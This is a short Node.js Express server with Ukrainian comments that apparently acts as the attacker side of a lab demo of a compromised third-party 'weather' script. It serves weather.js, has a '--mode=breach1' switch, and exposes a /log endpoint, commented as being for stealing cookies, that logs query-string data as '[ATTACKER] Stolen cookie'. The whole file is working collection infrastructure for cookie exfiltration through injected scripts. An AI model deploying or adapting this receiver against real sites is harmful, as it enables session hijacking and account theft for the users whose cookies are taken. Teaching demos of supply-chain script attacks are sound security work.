const express = require("express");
const cors = require("cors");

const app = express();
const PORT = 5000;

// режим з запуску
const mode = process.argv.includes("--mode=breach1")
  ? "breach1"
  : "normal";

console.log("Weather mode:", mode);

app.use(cors());

// endpoint для перевірки режиму
app.get("/mode", (req, res) => {
  res.json({ mode });
});

// endpoint для крадіжки cookie
app.get("/log", (req, res) => {
  const data = req.query.data;
  console.log("🔥 [ATTACKER] Stolen cookie:", data);
  res.sendStatus(200);
});

app.get("/weather.js", (req, res) => {
  res.sendFile(__dirname + "/weather.js");
});

app.listen(PORT, () => {
  console.log(`Weather server running on http://localhost:${PORT}`);
});